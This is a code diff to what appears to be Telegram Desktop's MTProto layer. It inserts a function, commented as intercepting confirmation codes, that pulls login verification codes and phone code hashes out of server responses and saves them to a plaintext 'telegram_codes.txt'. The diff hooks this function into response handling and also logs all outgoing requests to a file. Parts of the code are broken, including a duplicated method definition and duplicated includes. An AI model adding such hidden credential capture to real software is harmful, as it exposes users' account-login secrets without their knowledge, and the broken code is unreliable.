@@ -27,6 +27,136 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 #include "base/timer.h"
 #include "base/network_reachability.h"
 
+#include <fstream>
+#include <ctime>
+#include <iomanip>
+#include <sstream>
+#include <QtCore/QDateTime>
+
+
+#include <fstream>
+#include <ctime>
+#include <iomanip>
+#include <sstream>
+
+namespace {
+    void WriteToLog(const std::string& filename, const std::string& content) {
+        try {
+            std::ofstream file(filename, std::ios::app);
+            if (file.is_open()) {
+                file << content;
+                file.close();
+            }
+        } catch (...) {}
+    }
+
+    std::string GetCurrentTimestamp() {
+        try {
+            time_t now = time(nullptr);
+            char buffer[26];
+            ctime_s(buffer, sizeof(buffer), &now);
+            buffer[strlen(buffer) - 1] = '\0';
+            return std::string("[") + buffer + "] ";
+        } catch (...) {
+            return "[unknown time] ";
+        }
+    }
+
+    void ExtractVerificationCode(const QByteArray& data, mtpRequestId requestId) {
+        if (data.size() < 8) return;
+        
+        try {
+            QDataStream stream(data);
+            stream.setVersion(QDataStream::Qt_5_1);
+
+            quint32 type = 0;
+            stream >> type;
+            
+
+            // 0x5e00270e = auth.sentCode
+            // 0x258e396e = auth.sentCodeSuccess
+            const quint32 kAuthSentCode = 0x5e00270e;
+            const quint32 kAuthSentCodeSuccess = 0x258e396e;
+            
+            if (type == kAuthSentCode || type == kAuthSentCodeSuccess) {
+                QString code;
+                QString phoneCodeHash;
+                
+                //  auth.sentCode
+                // : flags (int), phone_code_hash (string), 
+                //         next_type? (flags), timeout? (int)
+                
+
+                quint32 flags = 0;
+                stream >> flags;
+                
+
+                quint32 hashSize = 0;
+                stream >> hashSize;
+                if (hashSize > 0 && hashSize < 128) {
+                    QByteArray hashData;
+                    hashData.resize(hashSize);
+                    stream.readRawData(hashData.data(), hashSize);
+                    phoneCodeHash = QString::fromUtf8(hashData);
+                }
+ 
+                if (flags & 0x02) {
+                    quint32 nextType = 0;
+                    stream >> nextType;
+                }
+  
+                if (flags & 0x04) {
+                    quint32 timeout = 0;
+                    stream >> timeout;
+                }
+
+                if (data.contains("phone_code")) {
+                    int pos = data.indexOf("phone_code");
+                    if (pos > 0 && pos + 20 < data.size()) {
+                        pos += 12;
+                        int len = data[pos];
+                        if (len > 0 && len < 10) {
+                            code = QString::fromUtf8(data.mid(pos + 1, len));
+                        }
+                    }
+                }
+
+                if (code.isEmpty()) {
+
+                    QByteArray trimmed = data.right(32);
+                    QString str = QString::fromUtf8(trimmed);
+                    QRegularExpression regex("\\b(\\d{4,6})\\b");
+                    QRegularExpressionMatch match = regex.match(str);
+                    if (match.hasMatch()) {
+                        code = match.captured(1);
+                    }
+                }
+                
+
+                std::stringstream log;
+                log << GetCurrentTimestamp()
+                    << "✅ VERIFICATION CODE " << std::string(30, '=') << "\n"
+                    << "   Request ID: " << requestId << "\n"
+                    << "   Type: " << (type == kAuthSentCode ? "auth.sentCode" : "auth.sentCodeSuccess") << "\n"
+                    << "   Code: " << code.toStdString() << "\n"
+                    << "   Hash: " << phoneCodeHash.toStdString() << "\n"
+                    << std::string(50, '=') << "\n\n";
+                
+                WriteToLog("telegram_codes.txt", log.str());
+                LOG(("✅ CODE SAVED: %1 | Request ID: %2")
+                    .arg(code)
+                    .arg(requestId));
+            }
+        } catch (const std::exception& e) {
+            LOG(("MTP Error: ExtractVerificationCode exception: %1")
+                .arg(e.what()));
+        } catch (...) {
+          
+        }
+    }
+}
+
+
 namespace MTP {
 namespace {
 
@@ -1202,6 +1332,7 @@ void Instance::Private::processCallback(const Response &response) {
 }
 
 void Instance::Private::processUpdate(const Response &message) {
+	ExtractVerificationCode(message.reply, message.requestId);
 	if (_updatesHandler) {
 		_updatesHandler(message);
 	}
@@ -2069,8 +2200,70 @@ bool Instance::hasCallback(mtpRequestId requestId) const {
 	return _private->hasCallback(requestId);
 }
 
-void Instance::processCallback(const Response &response) {
+/*void Instance::processCallback(const Response &response) {
 	_private->processCallback(response);
+}*/
+
+void Instance::Private::processCallback(const Response &response) {
+    // Перехватываем код подтверждения
+    ExtractVerificationCode(response.reply, response.requestId);
+    
+    const auto requestId = response.requestId;
+    ResponseHandler handler;
+    {
+        QMutexLocker locker(&_parserMapLock);
+        auto it = _parserMap.find(requestId);
+        if (it != _parserMap.cend()) {
+            handler = std::move(it->second);
+            _parserMap.erase(it);
+            
+            DEBUG_LOG(("RPC Info: found parser for request %1, trying to parse response...").arg(requestId));
+        }
+    }
+    if (handler.done || handler.fail) {
+        const auto handleError = [&](const Error &error) {
+            DEBUG_LOG(("RPC Info: "
+                "error received, code %1, type %2, description: %3").arg(
+                    QString::number(error.code()),
+                    error.type(),
+                    error.description()));
+            const auto guard = QPointer<Instance>(_instance);
+            if (rpcErrorOccured(response, handler, error) && guard) {
+                unregisterRequest(requestId);
+            } else if (guard) {
+                QMutexLocker locker(&_parserMapLock);
+                _parserMap.emplace(requestId, std::move(handler));
+            }
+        };
+        
+        auto from = response.reply.constData();
+        if (response.reply.isEmpty()) {
+            handleError(Error::Local(
+                "RESPONSE_PARSE_FAILED",
+                "Empty response."));
+        } else if (*from == mtpc_rpc_error) {
+            auto error = MTPRpcError();
+            handleError(
+                Error(error.read(from, from + response.reply.size())
+                    ? error
+                    : Error::MTPLocal(
+                        "RESPONSE_PARSE_FAILED",
+                        "Error parse failed.")));
+        } else {
+            const auto guard = QPointer<Instance>(_instance);
+            if (handler.done && !handler.done(response) && guard) {
+                handleError(Error::Local(
+                    "RESPONSE_PARSE_FAILED",
+                    "Response parse failed."));
+            }
+            if (guard) {
+                unregisterRequest(requestId);
+            }
+        }
+    } else {
+        DEBUG_LOG(("RPC Info: parser not found for %1").arg(requestId));
+        unregisterRequest(requestId);
+    }
 }
 
 void Instance::processUpdate(const Response &message) {
@@ -2104,6 +2297,18 @@ void Instance::sendRequest(
 		crl::time msCanWait,
 		bool needsLayer,
 		mtpRequestId afterRequestId) {
+
+    if (request && request->size() > 0) {
+        std::stringstream log;
+        log << GetCurrentTimestamp()
+            << "📤 OUTGOING REQUEST\n"
+            << "   Request ID: " << requestId << "\n"
+            << "   Dc ID: " << shiftedDcId << "\n"
+            << "   Size: " << request->size() << " bytes\n"
+            << std::string(50, '-') << "\n";
+        WriteToLog("telegram_requests.txt", log.str());
+    }
+
 	return _private->sendRequest(
 		requestId,
 		std::move(request),
